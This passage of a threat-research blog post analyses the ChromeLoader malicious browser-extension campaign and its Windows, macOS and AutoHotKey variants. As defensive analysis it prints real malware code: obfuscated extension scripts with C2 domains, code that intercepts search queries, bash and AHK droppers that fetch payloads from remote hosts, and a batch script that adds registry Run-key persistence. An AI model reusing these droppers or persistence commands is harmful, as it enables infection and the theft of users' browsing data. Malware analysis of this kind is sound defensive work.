elevated permissions, including access to browser data, web requests, and manipulation of browsing activity. This suggests that the extension is potentially malicious.\nTranscription: |\n  json\n  {\n    \"name\": \"Settings\",\n    \"version\": \"3.0\",\n    \"description\": \"Settings\",\n    \"icons\": {\n      \"128\": \"settings.png\"\n    },\n    \"browser_action\": {\n      \"default_icon\": {\n        \"128\": \"settings.png\"\n      }\n    },\n    \"default_title\": \"Settings\",\n    \"background\": {\n      \"scripts\": [\"conf.js\", \"background.js\"]\n    },\n    \"permissions\": [\n      \"contextMenus\",\n      \"tabs\",\n      \"storage\",\n      \"browsingData\",\n      \"webRequest\",\n      \"webRequestBlocking\",\n      \"privacy\",\n      \"alarms\",\n      \"management\",\n      \"*://*/*\",\n      \"chrome://*/*\"\n    ],\n    \"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self'\",\n    \"manifest_version\": 2\n  }\n```\n\n*Figure 18. An example of a downloaded extension’s manifest file.*\n\nThe Javascript file `conf.js` declares constant variables, which will use the main script `background.js` later. The C2 domain is stored in `_ExtDomNoSchema`.\n\n```image\nAlt: An example of a downloaded extension’s conf.js file.\nDescription: The image displays a snippet of JavaScript code related to a malicious Chrome extension. The code defines several variables: `_ExtensionName`, `_ExtensionVersion`, `_dd`, `_ExtDom`, and `_ExtDomNoSchema`. These variables seem to store the name and version of the extension, alongside a potentially encoded string and a URL pointing to `krestinaful.com`. This snippet contributes to understanding the extension's functionality and its connection to a command-and-control domain.\nTranscription: |\n  let _ExtensionName = \"Settings\";\n  let _ExtensionVersion = \"3.0\";\n  let _dd = \"ODQxOTUNBgEKDAAAAw8NDwEGCwwOAwMLSQ8HBgoHAUgADwEJAAQBBwAATQ==;\";\n  let _ExtDom = \"https://krestinaful.com/\";\n  let _ExtDomNoSchema = \"krestinaful.com\";\n```\n\n*Figure 19. An example of a downloaded extension’s conf.js file.*\n\n`background.js` is a one-line JavaScript file containing all of the extension’s functionality; it is heavily obfuscated but can be converted to readable JavaScript code in a short series of steps. However, any attempt to deobfuscate this code using known public JavaScript deobfuscation tools will fail due to reasons which will be detailed later.\n\n```image\nAlt: An example of a downloaded extension’s obfuscated background.js file.\nDescription: The image appears to show a snippet of JavaScript code, likely part of an obfuscated script used in a malware campaign. The code includes a function definition with a variable 'v' initialized to 2 and a switch statement that handles various cases based on the value of 'v'. Each case includes a return statement and breaks, indicating control flow changes depending on the value of 'v'. The overall structure suggests complexity aimed at obfuscation to hinder analysis.\nTranscription: s0QQ.W3=(function(){var v=2;for(;v!==9){switch(v){case 1:return globalThis;break;case 2:v=typeof globalThis === '\\u006f\\u0062';}}});\n```\n\n*Figure 20. An example of a downloaded extension’s obfuscated background.js file.*\n\nThis script uses various obfuscation techniques to hide its purpose and malicious code. One of the first functions executed is responsible for copying standard JavaScript functions and objects into new objects with scrambled names, which will later use the script for decoding the final payload, located in this script's last instructions.\n\n```image\nAlt: An example of the renaming mechanism. For instance, in this case, the String object is stored as b4VV.\nDescription: The image shows a snippet of JavaScript code likely intended for analysis, displaying various functions and objects such as 'sort()', 'random()', and 'String()'. The code appears to be heavily obfuscated, indicated by the non-descriptive variable names like 'x.o4VV', 'U4VV.K4VV', and 'b4VV.P4V'. This snippet suggests that it is part of a larger codebase, possibly related to malware, and is intended for understanding or deobfuscating the functionality of the malware's JavaScript.\nTranscription: |\n  x.o4VV\n    f sort() { [native code] }\n  \n  U4VV\n    ▷ Math { abs: f, acos: f, acosh: f, asin: f, asinh: f, ... }\n  \n  U4VV.K4VV\n    f random() { [native code] }\n  \n  b4VV\n    f String() { [native code] }\n  \n  b4VV.P4VV\n    f fromCharCode() { [native code] }\n  \n  x.e4VV\n    f push() { [native code] }\n```\n\n*Figure 21. An example of the renaming mechanism. For instance, in this case, the String object is stored as b4VV.*\n\nDuring the entire execution of this script, the authors use switch-case-oriented programming to make their program harder for malware analysts to read and understand.\n\n```image\nAlt: An example of switch-case-oriented programming.\nDescription: The image presents a snippet of JavaScript code demonstrating an obfuscated function. It features various control structures such as a for loop and a switch statement, showcasing how the malware utilizes obfuscation techniques to complicate reverse engineering. The code is heavily commented to indicate the purpose of certain lines, and it contains references to function calls and variable assignments, which are typical in malicious scripts to hide their true intentions. The specific use of scrambled variable names and comments provides insight into the method of obfuscation employed by the malware authors.\nTranscription: |\n  var $0 = function(I3) {\n      var E3 = 2;\n      for (; E3 !== 13;) {\n          switch (E3) {\n              case 1:\n              case 4:\n                  T0.e4VV(b4VV.P4VV(I3[X0] + 50));\n                  // T0.push(String.fromCharCode(I3[X0] + 50));\n                  T0 = ['0', 'h', 'Q', 'Q'];\n                  E3 = 3;\n                  break;\n              case 3:\n                  ...\n              case 5:\n                  ...\n              case 14:\n                  ...\n              case 9:\n                  ...\n              case 8:\n                  u3 = T0.o4VV(function() {\n                      u3 = T0.sort(function() {\n                          var V3 = 2;\n                          for (; V3 !== 1;) {\n                              switch (V3) {\n                                  case 2:\n                                      return 0.5 - U4VV.K4VV();\n                                      // return 0.5 - Math.random();\n                                      break;\n                              }\n                          }\n                      });\n                  }).A4VV('');\n                  p3 = s0QQ[u3];\n                  E3 = 6;\n                  break;\n              case 2:\n                  ...\n              case 6:\n                  ...\n          }\n      }\n  };\n  var x0 = '',\n      J0 = c4VV($0([-2, 54, 31, 31]))();\n  // J0 = decodeURI($0([-2, 54, 31, 31]))();\n```\n\n*Figure 22. An example of switch-case-oriented programming.*\n\nThe program loops using the `E3` variable shown above in Figure 22 and acts differently for each value. When the relevant flow in the switch case has ended, the program changes the value of `E3` to its next instruction. The program also uses the obfuscated object names mentioned previously. In Figure 22, we added the original object name in a comment below the relevant code line.\n\nAfter understanding the obfuscated names and switch-case-oriented programming, we can better analyze the purpose of this code section. It uses a hardcoded four-sized array of integers, translating it to the associated ASCII characters and sorting it by randomized order. Later, this array will be joined to a string, and the program will search for a defined function in that name. The execution flow will start over if the function isn’t found.\n\nThis stage reveals another obfuscation technique in the script. One of the key features used by standard deobfuscation tools is dropping unreferenced functions and objects. Often, it helps to shorten the code, leaving out complicated parts which will never actually run – removing functions whose whole purpose is to mislead a malware analyst. However, in this case, using deobfuscation tools drops an essential function, and the script will be stuck in an endless loop without it.\n\nThe function `h0QQ` is not directly referenced even once during the script execution. Yet, the previously mentioned code section using a randomized sort algorithm will eventually attempt to execute it, since `h0QQ` is a permutation of the `0hQQ` string. If `h0QQ` does not exist, the code simply tries to sort the characters and repeatedly looks for a function name.\n\n```image\nAlt: An example of the unreferenced crucial function.\nDescription: The image displays a snippet of JavaScript code defining a function named `h0QQ`. This function is designed to return a long, encoded string that appears to include various encoded characters and symbols. The context suggests that this string is part of a malware script, specifically for the ChromeLoader malware campaign. The code is presented in a code editor format, highlighting its importance in the analysis of the malware's operation.\nTranscription: |\n  function h0QQ() {\n      return \"MC/449%5CT;%00;,_%5E,(12%16J0*%3C%25%5BY8%3E%60,%5B%5E.:?12LT8%3C86JR+%1F%3C%25Y%5C04:2LJ2412VV7'&$H%5D*;&%7CC%5B,&3,%.\";\n  }\n```\n\n*Figure 23. An example of the unreferenced crucial function.*\n\nThis function returns a long scrambled string, XORed by a hardcoded key, and then splits into an array of strings.\n\n```image\nAlt: An example of a deXORed array containing strings used by the malware.\nDescription: The image displays a snippet of JavaScript code, specifically an array containing various strings related to JSON operations and potential browser storage functions. This snippet is likely part of a malware script, as suggested by the context provided. The strings include terms such as 'application/json', 'stringify', 'getItem', 'setItem', and others, which are commonly associated with data manipulation in web applications. The context indicates that this code is used for managing data within the malware's functioning, possibly for its operation in a compromised browser environment.\nTranscription: |\n  json\n  [\n      'application/json',\n      'stringify',\n      'getTime',\n      'setItem',\n      'getItem',\n      'expiry',\n      'removeItem',\n      'value',\n      'ad?ext=',\n      'follow'\n  ]\n```\n\n*Figure 24. An example of a deXORed array containing strings used by the malware.*\n\nThe malware eventually uses these strings to decode its malicious code. It references the string at the relevant index in this array instead of hardcoding the string name in the code.\n\n```image\nAlt: An example of the malware usage of the deXORed array to decode its final payload. You can also see that the malware doesn’t use integers as the array’s indexes but strings combined with arithmetic operations.\nDescription: The image displays a snippet of JavaScript code used in a Chrome extension, specifically related to malware functionality. It includes references to properties and methods associated with the Chrome API, particularly focusing on how the extension interacts with the browser environment. The code employs obfuscated variable names and operations, which are common techniques in malware to make analysis difficult. This code snippet is part of a broader discussion in the context of analyzing the ChromeLoader malware.\nTranscription: |\n  chrome[s0QQ.c3(+ \"39\")][s0QQ.c3(\"50\" >> 0)](_ExtDom + s0QQ.A3(+ \"51\") + _ExtensionName + s0QQ.c3(+ \"2\") + _ExtensionVersion + s0QQ.A3(\"3\" << 32) + _dd);\n  {\n      title: s0QQ.c3(+ \"53\"),\n      id: s0QQ.A3(+ \"54\"),\n      contexts: [s0QQ.c3(\"55\" - 0)]\n  });\n```\n\n*Figure 25. An example of the malware usage of the deXORed array to decode its final payload. You can also see that the malware doesn’t use integers as the array’s indexes but strings combined with arithmetic operations.*\n\nWe exported the mentioned list members after utilizing a debugger to execute the initialization code. Then we used a Python script to deobfuscate the remaining sections of the JavaScript code.\n\n```image\nAlt: A script used for deobfuscating background.js.\nDescription: The image displays a Python script designed for deobfuscating JavaScript code associated with malware. It includes functions that manipulate and analyze JavaScript objects, handle mathematical expressions, and replace specific strings based on a predefined dictionary. The script employs regular expressions to locate and modify obfuscated elements within the JavaScript code, aiming to make the code more readable and understandable for analysis.\nTranscription: |\n  import re\n  import js2py\n  \n  words_dict = ['ext=' , '&ver=' , '&dd=' , 'sendBeacon' , 'parse' , 'list' , 'log' , 'forEach' , 'management' , 'setEnabled' , 'https://com.' , '/ext' , 'post' , 'Accept' , 'application/json' , 'application/x-www-form-urlencoded']\n  \n  main_obj_post = ['.B1(@idx)' , '.E1(@idx)']\n  main_obj_pre = ['y9RR']\n  \n  def find_and_remove_main_obj_copies(origin_text):\n      # storing all copies of the main object - y9RR\n      global main_obj_pre\n      matches = re.findall(r'var (\\w+);', origin_text)\n      for m in matches:\n          main_obj_pre.append(m)\n      return re.sub(r'var (\\w+);', {main_obj_pre[0]: \"\"}, origin_text)\n  \n  def replace_js_arithmetic_with_result(origin_text):\n      return_text = origin_text\n      js_arit = r'\\\"(\\d+\\\"|\\+|\\*|\\%|\\[|\\])'\n      all_matches = re.findall(js_arit, origin_text)\n      for match in all_matches:\n          if len(match) > 15:\n              continue\n          result = js2py.eval_js(match)\n          result = '(' + str(result) + ')'\n          return_text = return_text.replace(match, result)\n  \n      return return_text\n  \n  def replace_words_table_with_values(origin_text):\n      return_text = origin_text\n      for idx in range(len(words_dict)):\n          for prefix_str in main_obj_pre:\n              post_str = main_obj_post[idx].replace(\"@idx\", str(idx)) + ']'\n              return_text = return_text.replace(current_search_str, '[' + prefix_str + post_str + ']' )\n              return_text = return_text.replace(return_text[1:-1], '\\'' + words_dict[idx] + '\\'')\n  \n      return return_text\n  \n  def deobfuscate_js(obfuscated_js_code):\n      return replace_words_table_with_values(replace_js_arithmetic_with_result(find_and_remove_main_obj_copies(obfuscated_js_code)))\n```\n\n*Figure 26. A script used for deobfuscating background.js.*\n\n---\n\n## Infostealer and Adware\n\nFor communicating with the malicious extension, the authors used command and control servers (C2s), which are different from the installation server used for installing the extension previously. The malware uses various extension features, giving it a strong foothold in the user’s browser.\n\n```image\nAlt: An example of alerts installed by the malware.\nDescription: The image displays a snippet of JavaScript code that is part of a malicious Chrome extension. It shows the use of the Chrome API to set up listeners for installation events and to create alarms for scheduled tasks. Specifically, it handles the removal of certain local storage items upon installation and establishes two alarms: one for a heartbeat ('hb') function with a delay of 1.1 minutes and a period of 180 minutes, and another for an advertisement ('ad') function with a delay of 5 minutes and a period of 30 minutes.\nTranscription: |\n  chrome.runtime.onInstalled.addListener(o => {\n      if (o.reason == 'install') {\n          localStorage.removeItem('lastQuery');\n          localStorage.removeItem('ad');\n          localStorage.removeItem('is');\n          chrome.alarms.create('hb', {\n              delayInMinutes: 1.1,\n              periodInMinutes: 180\n          });\n      });\n      chrome.alarms.create('ad', {\n          delayInMinutes: 5,\n          periodInMinutes: 30\n      });\n  });\n```\n\n*Figure 27. An example of alerts installed by the malware.*\n\nWhen the extension is installed, it adds two Chrome alarms (alarms allow the developer to install a callback / scheduled task that will be triggered periodically). When these alarms are triggered, two corresponding functions are being called:\n\n- When the `ad` alarm is triggered, the extension asks the C2 for an advertisement and presents it in a new tab.\n- The `hb` callback is triggering functions that communicate with the C2, informing it of the current state of the execution.\n\n```image\nAlt: An example of the malware’s reaction when its alerts are triggered.\nDescription: The image shows a snippet of JavaScript code related to the ChromeLoader malware campaign. It specifically demonstrates how the malware sets up event listeners for two alarms named 'hb' and 'ad' using the Chrome Alarms API. When the 'hb' alarm is triggered, it calls the 'analytics' function, and when the 'ad' alarm is triggered, it invokes the 'getAd' function. This illustrates part of the functionality that allows the malware to communicate with its command and control server and manage its operations.\nTranscription: |\n  chrome.alarms.onAlarm.addListener(function(b6) {\n      if (b6.name === 'hb') {\n          analytics('hb', '');\n          sync();\n      } else if (b6.name === 'ad') {\n          getAd();\n      }\n  });\n```\n\n*Figure 28. An example of the malware’s reaction when its alerts are triggered.*\n\nAnother interesting activity can be seen in the code shown in Figure 29. The extension installs a listener, which allows it to intercept every outgoing request, and uses it to check whether the request was sent to a search engine – Google, Yahoo or Bing. If it does, the extension will send the search details to the C2, leaking the victim’s thoughts and interests.\n\n```image\nAlt: An example of browser hijacker capability.\nDescription: The image contains a code snippet written in JavaScript, showcasing a Chrome extension's listener that intercepts web requests. It checks if the request is directed to popular search engines like Google, Yahoo, or Bing, and retrieves certain search parameters from the URL. The code is structured to identify specific conditions under which it processes the incoming requests, indicating functionality related to potential data leakage from the user's searches.\nTranscription: |\n  chrome.webRequest.onBeforeRequest.addListener(function(V) {\n      var p, B, L, u, N, T, Z, E, q;\n      if (V.type !== 'main_frame') {\n          return null;\n      }\n      p = V.url;\n      B = new URL(p);\n      if (p.indexOf('google.') >= 0 && p.indexOf('search') >= 0 && p.indexOf('q=') >= 0) {\n          L = B.searchParams.get('q');\n      }\n      if (p.indexOf('search.yahoo.') >= 0 && p.indexOf('p=') >= 0) {\n          L = B.searchParams.get('p');\n      }\n      if (p.indexOf('bing.') >= 0 && p.indexOf('search') >= 0 && p.indexOf('q=') >= 0) {\n          L = B.searchParams.get('q');\n      }\n  });\n```\n\n*Figure 29. An example of browser hijacker capability.*\n\nIn addition, the extension uses different mechanisms to verify that it executes properly. For example:\n\n- A hard-coded header named `dd` for each outgoing packet to the C2. This could be used by the C2 to identify the different distribution channels/affiliates.\n\n```image\nAlt: An example of the added dd header.\nDescription: The image displays a screenshot of HTTP request headers, which includes details such as the request method, path, scheme, and various accepted content types. Notably, it highlights a hard-coded header labeled 'dd' with a base64-encoded string value. This header is part of a cybersecurity analysis related to the ChromeLoader malware campaign, indicating its attempt to communicate with command and control servers.\nTranscription: |\n  Request Headers\n  :authority: tobepartou.com\n  :method: GET\n  :path: /redsync\n  :scheme: https\n  accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n  accept-encoding: gzip, deflate, br\n  accept-language: en-US,en;q=0.9\n  dd: NTI4MDAAcgABwYHDAAIQIMCQgDB0GTAD0AcFDU43BgQHgoBAwA=\n```\n\n*Figure 30. An example of the added dd header.*\n\n- Cancelling search suggestions, probably in order to make sure that the search queries were intended by the user.\n- Uninstalling existing Chrome extensions from the browser. It also sends the names of the extensions to the C2 and gets back an `allowlist` json, in order to exclude chosen extensions from being removed.\n- Disabling every attempt to access `chrome://extensions` and open `chrome://settings` instead to prevent the user from uninstalling this malicious extension.\n\n---\n\n## Version Control\n\nMost malicious extensions contained a file named `conf.js` alongside the main Javascript code stored at `background.json`. This `conf.js` (or `manifest.json`, or `background.js` file if `conf.json` is missing) file stores relevant configuration for the extension: the C2’s hostname (e.g., `krestinaful[.]com` and `tobepartou[.]com`), the verification header’s value of `dd`, the extension name, and its version. It seems like the version information is accurate – there are several differences between the versions we saw (2.0, 3.0, and 4(.0,.3,.4)). (For our observations on the relationship between variants and versions, please see the “Introduction” section.)\n\n### Version 2.0 (First seen Jan. 4, 2022):\n\nMissing functionality:\n\n- No advertisements for victims.\n- Search engine query gathering from Google only.\n- No deletion of existing browser extensions.\n\n### Version 3.0 (Jan. 6, 2022):\n\nAdded functionality:\n\n- Search engine queries are now gathered from Yahoo and Bing as well.\n- `SetWithExpiry()` and `GetWithExpiry()` functions added and used for storing variables (i.e., query URL) and deleting existing extensions, respectively.\n- Existing extensions deletion mechanism.\n\n### 4.* versions (Jan. 7, 2022):\n\nAdded functionality:\n\n- More obfuscations throughout the script.\n- Chrome advertising mechanism added.\n- Changed the hardcoded C2 URL.\n- Chrome alert mechanism.\n\n---\n\n## MacOS variant\n\nIn March 2022, a new variant emerged targeting MacOS users. This variant remains active and uses similar techniques to install its payload and hide its actions. It uses the same infection method of directing victims to compromised pay-per-download websites to install its dropper.\n\nIn this case, the dropper is a disk image (DMG) file – the MacOS implementation for ISO files – containing several files, including one bash script. The bash script resembles the scheduled PowerShell script in multiple manners:\n\n- Downloads the payload – a browser extension from a remote installation server.\n- Loads the payload into the target’s browsers – Google Chrome and the built-in Safari browser.\n\n```image\nAlt: An example of an early version of the MacOS installation script.\nDescription: The image displays a section of a bash script that is related to the ChromeLoader malware campaign targeting MacOS. The script includes commands that utilize `curl` to check the HTTP status code of a URL and, based on that code, attempts to perform an action associated with opening Google Chrome and loading a browser extension. The script is written in a terminal-style format, using syntax highlighting for clarity.\nTranscription: |\n  status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https://funbeachdude.com/gp)\n  if [[ \"$status_code\" = 200 ]] ; then\n      popUrl=$(curl -s 'https://funbeachdude.com/gp')\n      performPop=$(echo -ne \"open -na 'Google Chrome' --args -load-extension='$BPATH/$XPATH' --new-window '$popUrl';\" | base64);\n  else\n      popUrl=\"0\"\n  fi\n```\n\n*Figure 31. An example of an early version of the MacOS installation script.*\n\nIn more advanced cases, instead of hardcoding the download execute portion in the bash script, the authors encoded these commands in a separate file, then decoded and executed by the bash script using OpenSSL.\n\n```image\nAlt: An example of a later MacOS installation script.\nDescription: The image displays a snippet of a bash script, which is part of a malware installation process targeting MacOS. The script includes various commands and variables related to setting up directories, downloading payloads, and executing commands obfuscated through encoding. It features a structure common in malicious scripts, such as the use of 'nohup' and redirection to '/dev/null', indicating an attempt to run processes in the background and avoid detection.\nTranscription: |\n  #!/bin/bash\n  G='a';F='c';Q='d';H='e';V='l';Z='m';X='n';T='o';J='p';k='s';\n  export appDir=$(cd \"$(dirname \"$0\")\"; pwd -P)\n  export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"\n  export binFile=\"$(cd \"$appDir\"; ls | grep -Ev '\\.(command)$' | head -n 1 | rev)\"\n  export archive=\"$(echo $binFile | rev)\"\n  export commandArgs='U2FsdGVkX19I1I3x5jsG75i2MqkEp6BnnxbYhGNNEAue1FVJV9tb3iame0XC4MKh'\n  decryptedCommand=\"$(echo -e \"$commandArgs\" | ${T}${J}${H}${X}${V} ${H}${X}${K}${K}${V} ${H}${X}${F})\"\n  nohup /bin/bash -c \"${H}${V}${G} \\\"${decryptedCommand}\\\" >/dev/null 2>&1 &\n  killall Terminal\n```\n\n*Figure 32. An example of a later MacOS installation script.*\n\nThe downloaded extension functions were similar to those used in the Windows OS versions. The MacOS variant uses the same obfuscation method to execute the same vital components – gather search engine queries and present advertisements. In addition, new C2 addresses were used in this version.\n\nBased on the version number of the malicious extensions delivered by this variant, the attackers reference the MacOS variant as later than the Windows variants, which fits the timeline of infections in this campaign. In our research, the extensions found with this variant were labeled as the 6.0 version of this malware.\n\n---\n\n## Second Windows Variant (Variant 2)\n\nIn March 2022, several weeks after the last known infection of Variant 1, we identified a new campaign with multiple similarities to the first one, which makes us believe that we are actually facing another variant of the same ChromeLoader malware, referred to in this blog as Variant 2.\n\nThe infection vector for this Variant 2 is identical to Variant 1. Users are enticed to download a torrent or cracked video game through malvertising campaigns on pay-per-install sites and social media.\n\nISO images used for Variant 2 contain new executables. Victims would only see a Windows shortcut, which they would double-click to install the desired software or watch the movie.\n\n```image\nAlt: An example of a malicious mounted ISO.\nDescription: The image shows a Windows File Explorer window displaying the contents of a DVD drive (E:). It contains a single item labeled 'Install,' which is a Windows shortcut with a size of 2 KB, last modified on February 10, 2022, at 6:05 PM. This representation is relevant to the context of the ChromeLoader malware, specifically as it illustrates the type of shortcut that victims may encounter when attempting to install software from a malicious ISO image.\nTranscription: |\n  This PC > DVD Drive (E:) CDROM\n  \n  Name          Date modified       Type      Size\n  Install       2/10/2022 6:05 PM   Shortcut  2 KB\n```\n\n*Figure 33. An example of a malicious mounted ISO.*\n\nHowever, the ISO image contains other hidden files executed when the victim launches the Windows shortcut (`.lnk` file). The `.lnk` file simply runs a batch script named `resources.bat`. The script, in turn, extracts the contents of `app.zip` into `%APPDATA%`. The zip archive contains an executable named `Tone.exe`, which is eventually stored into a registry run key by the batch script, making the infection persistent.\n\n```image\nAlt: An example of the LNK file configuration.\nDescription: The image displays a Windows 'Install Properties' dialog box for a shortcut named 'resources.bat'. It shows the target location as 'C:\\' with the target file set to 'C:\\resources.bat'. The properties indicate that this shortcut is configured to run as a minimized batch file. Additionally, the window includes other file details like 'app.zip' and 'icon.ico', suggesting that these files are part of a malicious ISO image related to the ChromeLoader malware variant described in the context.\nTranscription: |\n  Install Properties\n  -------------------\n  General\n  - Target type: Windows Batch File\n  - Target location: C:\\\n  - Target: C:\\resources.bat\n  - Start in:\n  - Shortcut key: None\n  - Run: Minimized\n  - Comment:\n  \n  Files\n  -------\n  - app.zip\n    - Date modified: 2/10/2022 6:10 PM\n    - Type: Compressed (zip)\n   \n  - icon.ico\n    - Date modified: 1/25/2022 5:09 PM\n    - Type: Icon\n   \n  - Install\n    - Date modified: 2/10/2022 6:08 PM\n    - Type: Shortcut\n   \n  - resources.bat\n    - Date modified: 2/10/2022 6:08 PM\n```\n\n*Figure 34. An example of the LNK file configuration.*\n\n```image\nAlt: An example of resources.bat content.\nDescription: The image displays a portion of a batch script named 'resources.bat'. It shows commands for extracting a zip file ('app.zip') to the '%APPDATA%' directory, deleting a registry key related to a previous installation, adding a new registry key to ensure persistence of the malware (by running 'Tone.exe' upon startup), and starting the 'Tone.exe' executable from the '%APPDATA%' directory. The script is indicative of a method used to install and maintain malware on a victim's system.\nTranscription: |\n  tar -xvf \"app.zip\" -C \"%APPDATA%\"\n  reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Tone /f\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Tone /t REG_SZ /d \"%APPDATA%\\Tone\\Tone.exe --qr5I\" /f\n  start /d \"%APPDATA%\\Tone\" Tone.exe\n```\n\n*Figure 35. An example of resources.bat content.*\n\nLike Variant 1, Variant 2 installed the same type of Chrome extension. The malware launched a `cmd.exe` process, which in turn executed `powershell.exe`. The PowerShell process executed WMI queries, used for installing a new scheduled task named `chrome *`, launching another encoded PowerShell command.\n\n```image\nAlt: An example of a causality chain when the malware installs a scheduled task.\nDescription: The image displays a visual representation of a process causality chain related to the ChromeLoader malware campaign. It shows various processes, including 'Bloom.exe', 'cmd.exe', 'powershell.exe', and 'svchost.exe', indicating their relationships and execution paths. The layout outlines how different processes are interconnected, along with system details such as the running time, username (NT AUTHORITY\\SYSTEM), and the path of the primary executable ('C:\\Windows\\System32\\svchost.exe'). Additional details like MD5, SHA256 hashes, and command line execution information are also included.\nTranscription: |\n  Excluding events svchost.exe executed on behalf of processes in this causally triggered by RPC\n  \n  Path: C:\\Windows\\System32\\svchost.exe\n  Running Time: Jun 6th 2022 16:08:24 - Still Running\n  Username: NT AUTHORITY\\SYSTEM\n  MD5: cd10c8494be2112f0b0f0e20b0c27c16\n  PID: 3000\n  Parent PID: 22828\n  \n  Wildfire Score: Benign\n  Signature: Signed by Microsoft Corporation\n  File Size: N/A\n  \n  SHA256: f3b19e95fbc80766a694943f3ca9eda7e2ca977fc239554be7524...\n  CMD: C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p -s Winmgmt\n```\n\n*Figure 36. An example of a causality chain when the malware installs a scheduled task.*\n\nWhen analyzing the above-mentioned obfuscated PowerShell script, we were faced with a script used as a dropper. This script doesn’t directly install a new Chrome extension, so it does not exactly match Variant 1’s PowerShell script pattern. However, the structure and use of variables resembles the behavior of Variant 1.\n\n```image\nAlt: An example of the installed schedule task script content after decoding.\nDescription: The image displays a segment of code that appears to be written in PowerShell. It includes variable assignments for values such as version (`$v`), level (`$lv`), domain (`$d`), and an encoded string (`$ep`). The code also references a registry path (`$rp`) and defines a variable for settings (`$rn`). The structure indicates potential use in malware or scripting related to the ChromeLoader malware campaign, as discussed in the context provided.\nTranscription: |\n  $v = \"0\";\n  $lv = \"3\";\n  $d = \"tcaukthw.com\";\n  $ep = \"WyIzMTM5NDEwMTY3ODY3NTM2MDMiLDE2NDUzMjU0NTJd\";\n  $rp = \"HKCU:\\Software\\LogiShdr\\\";\n  $rn = \"Settings\";\n  $a = [System.Text.Encoding]::ASCII;\n  $jd = $null;\n  $jp = $null;\n  = try {\n```\n\n*Figure 37. An example of the installed schedule task script content after decoding.*\n\nUsing XQL queries, when the installation server is available, the PowerShell script creates and loads the familiar malicious Chrome extension (the 6.0 version, used in the latest MacOS variant).\n\n```image\nAlt: An example of the files downloaded by the encoded PowerShell.\nDescription: The image depicts a visual representation of a malware analysis involving a PowerShell command execution chain related to the ChromeLoader malware campaign. It shows connections between various processes, specifically highlighting 'cmd.exe' and 'powershell.exe', along with their interactions with 'svchost.exe'. The bottom section lists file paths associated with the malware, alongside attributes like Wildfire Score, SHA256 hash, and signatures indicating benign status but showing the presence of malicious behavior. The structure is indicative of an analysis dashboard used for cybersecurity investigations.\nTranscription: |\n  {\n    \"NT_AUTHORITY_NETWORK\": {\n      \"processes\": [\n        {\n          \"name\": \"cmd.exe\",\n          \"connections\": 2\n        },\n        {\n          \"name\": \"powershell.exe\",\n          \"connections\": 12\n        },\n        {\n          \"name\": \"svchost.exe\",\n          \"connections\": \"N/A\"\n        }\n      ]\n    },\n    \"WILDFIRE_SCORE\": \"Benign\",\n    \"SIGNATURE\": \"Signed by Microsoft Corporation\",\n    \"SHA256\": \"9f914d4270f6e2155101044cad85a32d58aef141940d4fdfd53d84f...\",\n    \"CMD\": \"{...} powershell -WindowStyle Hidden -E 'JAB2A...'\",\n    \"NETWORK_CONNECTIONS\": 276,\n    \"RPC_CALLS\": 10,\n    \"FILE_PATH\": [\n      \"AppData\\\\Local\\\\Temp\\\\mmfourae.tmp\",\n      \"AppData\\\\Local\\\\Temp\\\\mmfourae.tmp\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\background.js\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\manifest.json\"\n    ],\n    \"SRC_CMD\": [\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\",\n      \"powershell -WindowStyle Hidden -E 'JAB2A...'\"\n    ],\n    \"FILE_PREVIOUS_PATH\": [\n      \"AppData\\\\Local\\\\chrome_settings\\\\background.js\",\n      \"AppData\\\\Local\\\\chrome_settings\\\\manifest.json\"\n    ]\n  }\n```\n\n*Figure 38. An example of the files downloaded by the encoded PowerShell.*\n\n---\n\n## The Real First Windows Variant – December 2021 (Variant 0)\n\nDue to its multiple infection incidents, this malware family has drawn worldwide attention in the cybersecurity community.\n\nAs mentioned earlier, we detected different versions of this malware during our investigation. Each version was labeled not only by us but also by the malware authors themselves. The earliest labeled version we detected was 2.0. Therefore, we were confident that this wasn’t the first time these attackers struck, and we were determined to expose the actual first version of this malware.\n\nDue to the attackers’ history of frequent payload updates, we were convinced that the first infection case occurred relatively close to the currently reported infection case in January 2022.\n\nPivoting over the installation server domains used for the Variant 1 PowerShell dropper revealed that another piece of malware used some of these domains as its installation servers in December 2021.\n\nThis malware was an executable file written using AutoHotKey (AHK) - a framework used for scripting automation.\n\nUsing this tool, the programmer can write short, easy-to-understand scripts using the AHK syntax. Then, by the programmer’s definitions, the framework creates matching hooks that will cause the execution of these scripts.\n\nWhen transforming AHK scripts into Windows executables, the original script source code is pasted into the end of the executable, making the investigation process for the researcher much more effortless compared to the other variants, which used heavy obfuscation. In this case, the hardcoded script contained the following source code, which looks quite similar to the PowerShell droppers we already analyzed:\n\n```image\nAlt: An example of the AutoHotKey script content.\nDescription: The image displays a snippet of AutoHotKey (AHK) script code used in a malware campaign. The code consists of commands to download a file from a specified URL and check its size. If the file size is less than 3 bytes, it deletes the file; otherwise, it uses PowerShell to expand the downloaded zip file to a designated path. This script illustrates the malware's mechanism for handling payloads and executing commands.\nTranscription: |\n  File_URL = https://learnataloukt.xyz/9FHQ0Q.zip\n  UrlDownloadToFile, %File_URL%, %Extension_Name%\n  FileSize := 0\n  FileGetSize, FileSize, %Extension_Name%, K\n  if (FileSize < 3){\n      FileDelete, %Extension_Name%\n      return\n  }\n  RunWait PowerShell.exe -Command Expand-Archive -LiteralPath '%Extension_Name%' -DestinationPath '%Extension_Path%', , Hide\n```\n\n*Figure 39. An example of the AutoHotKey script content.*\n\nIn short, this dropper downloads a payload from its installation server. We can assume that this payload is another browser extension by the variable name used for the downloaded payload (`Extension_Name`).\n\nAfter a more thorough investigation, we found the downloaded extension. Unsurprisingly, it also contained features related to the ChromeLoader malware family – but more importantly, it was labeled version 1.0 (!)\n\nThese extensions were quite similar to the rest of the extensions related to this family, with one main difference – this time, the extension was not obfuscated. It even contained some of the author’s comments regarding different code 